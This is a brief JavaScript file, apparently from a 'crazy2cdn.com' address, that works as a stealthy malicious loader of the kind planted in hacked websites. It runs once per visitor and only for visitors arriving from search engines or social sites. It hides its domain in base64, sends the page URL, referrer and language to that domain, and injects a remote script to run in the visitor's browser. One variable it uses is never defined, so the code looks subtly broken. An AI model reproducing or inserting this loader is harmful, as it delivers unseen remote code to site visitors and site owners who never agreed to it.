// url: https://crazy2cdn.com/min.t.1714640400.js?v=66335d18

!function (e, t) {
    const n = "se",
    r = document.cookie; 
    document.cookie = n + "=1;path=/"; 
    const o = document.referrer && document.referrer.split("/").length > 2 ? document.referrer.split("/")[2] : document.referrer; 
    if (!o || -1 != r.indexOf(n)) return; 
    if (-1 == o.indexOf("google.") && -1 == o.indexOf("bing.") && -1 == o.indexOf("facebook.") && -1 == o.indexOf("yahoo") && -1 == o.indexOf("instagram") && -1 == o.indexOf("naver") && -1 == o.indexOf("pinterest")) return;
    const crazy2cdnurl = atob("Y3JhenkyY2RuLmNvbQ==");
    (t = e.createElement("script")).type = "text/javascript", 
    t.async = !0; 
    let i = []; 
    i.rr = "sq4ct8g5", 
    i.u = window.location.href, 
    i.r = document.referrer, 
    i.l = window.navigator.language, 
    t.src = "https://" + c + "/js/script.js?" + btoa(function (e) { const t = []; for (let n in e) t.push(encodeURIComponent(n) + "=" + encodeURIComponent(e[n])); return t.join("&") }(i)), e.getElementsByTagName("head")[0].appendChild(t)
}(document);

